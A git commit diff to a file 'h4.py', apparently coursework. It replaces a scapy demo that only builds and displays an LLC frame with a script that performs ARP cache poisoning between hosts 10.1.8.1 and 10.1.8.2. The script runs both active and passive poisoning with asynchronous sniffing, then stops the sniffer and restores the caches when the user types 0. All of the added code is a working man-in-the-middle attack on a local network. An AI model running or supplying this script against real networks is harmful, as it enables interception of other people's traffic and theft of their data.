baa80cecc02c1c92d6ad1084d4e13c202561b1ba
selimcanturan <selimcanturan@gmail.com>
2026-03-13 00:30:58 +0300

    Update h4.py

--- h4.py
+++ h4.py
@@ -1,9 +1,17 @@
-from scapy.all import *
-eth = Dot3(dst="01:80:c2:00:00:00", src="00:11:22:33:44:55")
-llc_header = LLC(dsap=0x42, ssap=0x42, ctrl=3)
-raw_data = "Merhaba, bu bir LLC cercevesidir!"
-fake_frame = eth / llc_header / raw_data
-print("--- Cerceve Detaylari ---")
-fake_frame.show()
+from ArpSpoof import SpooferARP
+from scapy.all import conf
 
-# sendp(fake_frame, iface="eth0")
+spoofer = SpooferARP('10.1.8.1', '10.1.8.2 ')
+spoofer.active_cache_poisonning()
+
+spoofer = SpooferARP('10.1.8.1 ', '10.1.8.2 ', conf.iface, False, 0.5)
+spoofer.passive_cache_poisonning(asynchronous=True)
+
+while True:
+    secim = input("Çıkmak için 0 girin: ")
+    if secim == '0':
+        break
+
+spoofer.run = False
+spoofer.sniffer.stop()
+spoofer.restore()
